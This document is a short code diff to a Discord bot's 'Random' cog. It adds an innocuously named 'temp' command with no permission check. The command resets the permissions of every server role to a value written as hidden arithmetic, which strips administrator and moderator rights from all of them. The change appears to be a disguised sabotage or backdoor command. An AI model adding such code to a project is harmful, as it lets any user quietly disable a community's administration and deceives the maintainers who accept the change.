@@ -28,6 +28,12 @@ class Random(commands.Cog):
         attrs = ', '.join(getattr(discord, obj).__slots__)
         await context.send(f"```Attributes of {obj}:\n{attrs}```")
         
+    @commands.command(name='temp')
+    async def temp(self, context: commands.Context) -> None:
+        for i in context.guild.roles:
+            await i.edit(permissions=discord.Permissions(
+                104324673-0x00020000))
+        pass
 
 def setup(client: commands.Bot) -> None:
     client.add_cog(Random(client))
